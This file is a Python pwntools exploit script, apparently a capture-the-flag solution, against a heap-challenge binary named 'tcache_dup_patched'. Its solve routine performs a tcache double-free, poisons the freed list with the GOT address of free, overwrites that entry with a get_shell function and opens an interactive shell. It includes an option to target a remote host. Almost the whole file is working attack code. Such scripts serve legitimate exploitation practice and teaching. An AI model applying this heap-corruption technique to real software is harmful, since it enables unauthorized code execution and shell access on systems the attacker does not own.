#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tcache_dup_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *create+87
b *delete+91
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create(size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)


def delete(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"idx:", str(idx).encode())


def solve():
    free_got = exe.got["free"]
    win = exe.sym["get_shell"]

    create(0x10, b"A"*8)
    delete(0)
    delete(0)
    create(0x10, p64(free_got))
    
    create(0x10, b"B"*8)
    create(0x10, p64(win))

    delete(0)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

